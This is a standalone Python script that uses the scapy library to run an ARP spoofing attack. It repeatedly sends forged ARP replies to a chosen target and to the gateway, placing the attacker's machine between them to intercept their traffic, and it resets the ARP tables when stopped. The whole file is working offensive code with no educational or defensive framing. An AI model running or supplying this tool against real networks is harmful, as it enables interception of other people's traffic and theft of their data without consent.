#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse

def get_inputs():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--tip", dest="target_ip", help="Specify target ip address")
    parser.add_option("-s", "--sip", dest="gateway_ip", help="Specify gateway ip address")
    (options, arguements) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-]Please specify target ip ,--help for more info")
    if not options.gateway_ip:
        parser.error("[-]Please specify gateway ip, --help for  more info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_arp_request = broadcast/arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip,target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(targte_ip,spoof_ip,target_mac,spoof_mac):
    packet=scapy.ARP(op=2, pdst=targte_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(packet, verbose=False)

options = get_inputs()
target_mac = get_mac(options.target_ip)
destination_mac = get_mac(options.gateway_ip)
packet_count = 0

try:
    while True:
        spoof(options.target_ip, options.gateway_ip, target_mac)
        spoof(options.gateway_ip, options.target_ip, destination_mac)
        packet_count = packet_count+2
        print("\r![+]Packet sent :"+str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n![-]Keyboard interruption occurred CTRL + C.....Quiting")
    restore(options.target_ip, options.gateway_ip, target_mac, destination_mac)
    restore(options.gateway_ip, options.target_ip, destination_mac, target_mac)
    print("![-]Resetting ARP tables way they were .......Wait :")